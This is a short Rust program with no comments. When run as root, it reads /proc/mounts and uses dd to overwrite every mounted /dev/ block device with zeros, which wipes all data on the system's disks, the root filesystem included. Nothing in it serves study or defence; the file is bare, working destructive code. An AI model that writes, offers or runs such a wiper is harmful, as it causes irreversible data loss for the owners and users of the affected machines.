use std::fs;
use std::process::Command;
fn main() {
    if unsafe { libc::geteuid() } != 0 { return; }
    let text = fs::read_to_string("/proc/mounts").unwrap_or_default();
    for line in text.lines() {
        if line.starts_with("/dev/") {
            let dev = line.split_whitespace().next().unwrap();
            let _ = Command::new("dd").args(["if=/dev/zero", &format!("of={dev}")]).status();
        }
    }
}
